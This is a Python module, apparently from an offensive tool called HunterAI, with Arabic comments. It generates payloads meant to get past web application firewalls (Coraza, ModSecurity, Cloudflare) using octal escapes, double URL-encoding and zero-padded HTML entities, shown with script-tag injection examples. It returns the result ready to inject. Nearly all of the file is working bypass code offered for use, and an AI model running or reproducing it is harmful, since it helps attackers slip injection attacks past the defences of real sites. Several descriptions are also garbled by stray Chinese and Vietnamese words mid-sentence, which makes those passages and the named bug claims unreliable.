"""
HunterAI WAF Parser Bug Exploitation
=====================================

استغلال أخطاء البرمجة في محللات الـ WAF (Parsers) لجعلها ترى الحمولة
بشكل مختلف عن التطبيق الخلفي.

مثال حقيقي (2026): ثغرة Off-by-One في دالة `jsDecode` من WAF **Coraza**
عند معالجة تسلسلات Octal JavaScript. هذه الثغرة تجعل الـ WAF يفسّر التشفير
بطريقة خاطئة بينما التطبيق الخلفي يفكّه بشكل صحيح.

المصدر: أبحاث ثغرات محللات WAF في 2025-2026.
"""

from __future__ import annotations

import re
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional


@dataclass
class ParserBugResult:
    target: str
    bug_name: str
    waf_product: str
    parser_function: str
    original_payload: str
    bypass_payload: str
    technique: str = "parser_bug"
    verified: bool = False
    timestamp: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "target": self.target,
            "bug_name": self.bug_name,
            "waf_product": self.waf_product,
            "parser_function": self.parser_function,
            "original_payload": self.original_payload,
            "bypass_payload": self.bypass_payload,
            "technique": self.technique,
            "verified": self.verified,
            "timestamp": self.timestamp,
        }


class ParserBugDatabase:
    """
    قاعدة معرفية بأخطاء المحللين المعروفة في WAFs مختلفة.
    """

    BUGS: list[Dict[str, Any]] = [
        {
            "bug_id": "CORAZA_JSDECODE_OFFBYONE_2026",
            "name": "Coraza jsDecode Off-by-One (Octal)",
            "waf_product": "Coraza",
            "parser_function": "jsDecode",
            "description": "خطأ Off-by-One عند معالجة تسلسلات Octal في JavaScript يجعل الـ WAF يرى الحمولة بشكل خاطئ بينما التطبيق الخلفي يفكّها بشكل صحيح.",
            "original_pattern": r"\\\\x[0-9a-fA-F]{2}",
            "bypass_pattern": r"\\\\0[0-7]{2,3}",  # تسلسلات Octal تُربك المحلل
            "example_original": "\\x3cscript\\x3e",
            "example_bypass": "\\074script\\076",
        },
        {
            "bug_id": "MODSEC_URLENCODE_DOUBLE_2025",
            "name": "ModSecurity Double URLDecode Inconsistency",
            "waf_product": "ModSecurity",
            "parser_function": "urlDecode",
            "description": "عدم تناسق في تفكيك التشفير المزدوج يجعل الـ WAF يرى حمولة واحدة بينما التطبيق الخلفي يرى حمولة أخرى.",
            "original_pattern": r"%[0-9a-fA-F]{2}",
            "bypass_pattern": r"%25%30%30",  # %00 مزدوج التشفير
            "example_original": "%3cscript%3e",
            "example_bypass": "%253cscript%253e",
        },
        {
            "bug_id": "CLOUDFLARE_ENTITY_ENCODE_2025",
            "name": "Cloudflare HTML Entity Encoding Inconsistency",
            "waf_product": "Cloudflare",
            "parser_function": "htmlEntityDecode",
            "description": "عدم تناسق في تفكيك كيانات HTML يجعل علامات القص被忽略 من قبل الـ WAF بينما التطبيق الخلفي يراها.",
            "original_pattern": r"&#[0-9]+;",
            "bypass_pattern": r"&#x0003c;",  # كيان thập lục phân مع أصفار مقدمة
            "example_original": "&#60;script&#62;",
            "example_bypass": "&#x0003c;script&#x0003e;",
        },
    ]

    def __init__(self):
        self.bug_map: Dict[str, Dict[str, Any]] = {b["bug_id"]: b for b in self.BUGS}

    def list_bugs(self, waf_product: Optional[str] = None) -> list[Dict[str, Any]]:
        if waf_product:
            return [b for b in self.BUGS if b["waf_product"].lower() == waf_product.lower()]
        return list(self.BUGS)

    def get_bug(self, bug_id: str) -> Optional[Dict[str, Any]]:
        return self.bug_map.get(bug_id)


class ParserBugExploiter:
    """
    يستغل أخطاء المحللين لتوليد حمولات تخطي لـ WAF.
    """

    def __init__(self, safety_loop=None):
        self.db = ParserBugDatabase()
        self.safety_loop = safety_loop

    def generate_bypass(
        self,
        target: str,
        bug_id: str,
        original_payload: str,
    ) -> ParserBugResult:
        """
        يولد حمولة تخطي بناءً على خطأ محلل معروف.
        """
        bug = self.db.get_bug(bug_id)
        if not bug:
            raise ValueError(f"Bug {bug_id} not found in database")

        bypass_payload = original_payload
        # تطبيق التحويل حسب نوع الخطأ
        if bug["bug_id"] == "CORAZA_JSDECODE_OFFBYONE_2026":
            bypass_payload = self._coraza_jsdecode_bypass(original_payload)
        elif bug["bug_id"] == "MODSEC_URLENCODE_DOUBLE_2025":
            bypass_payload = self._modsec_double_urlencode_bypass(original_payload)
        elif bug["bug_id"] == "CLOUDFLARE_ENTITY_ENCODE_2025":
            bypass_payload = self._cloudflare_entity_bypass(original_payload)

        return ParserBugResult(
            target=target,
            bug_name=bug["name"],
            waf_product=bug["waf_product"],
            parser_function=bug["parser_function"],
            original_payload=original_payload,
            bypass_payload=bypass_payload,
            technique="parser_bug",
        )

    def _coraza_jsdecode_bypass(self, payload: str) -> str:
        """تحويل تسلسلات HTML إلى Octal لخداع محلل Coraza."""
        mapping = {
            "<": "\\074",
            ">": "\\076",
            "\"": "\\042",
            "'": "\\047",
            "(": "\\050",
            ")": "\\051",
        }
        result = []
        for ch in payload:
            result.append(mapping.get(ch, ch))
        return "".join(result)

    def _modsec_double_urlencode_bypass(self, payload: str) -> str:
        """تشفير مزدوج لخداع ModSecurity."""
        import urllib.parse
        once = urllib.parse.quote(payload, safe="")
        twice = urllib.parse.quote(once, safe="")
        return twice

    def _cloudflare_entity_bypass(self, payload: str) -> str:
        """تحويل علامات HTML إلى كيانات thập lục phân مع أصفار."""
        mapping = {
            "<": "&#x0003c;",
            ">": "&#x0003e;",
            "\"": "&#x00022;",
            "'": "&#x00027;",
        }
        result = []
        for ch in payload:
            result.append(mapping.get(ch, ch))
        return "".join(result)

    def test_bypass(
        self,
        target: str,
        bug_id: str,
        original_payload: str,
    ) -> Dict[str, Any]:
        """
        يختبر حمولة التخطي ضد الهدف مع فحص السلامة العصبية-الرمزية.
        """
        # فحص السلامة أولاً
        if self.safety_loop:
            from hunter_ai.safety.neuro_symbolic_loop import KnowledgeGraph
            kg = KnowledgeGraph()
            check = self.safety_loop.check_command(
                command=f"waf-parser-bug:{bug_id}",
                target=target,
                require_proof=False,
            )
            if check.verdict.value == "BLOCKED":
                return {
                    "status": "BLOCKED_BY_SAFETY",
                    "reason": check.reason,
                }

        result = self.generate_bypass(target, bug_id, original_payload)
        result.verified = False  # يتطلب اختبار فعلي ضد الهدف

        return {
            "status": "READY",
            "bypass_result": result.to_dict(),
            "note": "أرسل الحقل bypass_payload في حقنة الاختبار",
        }
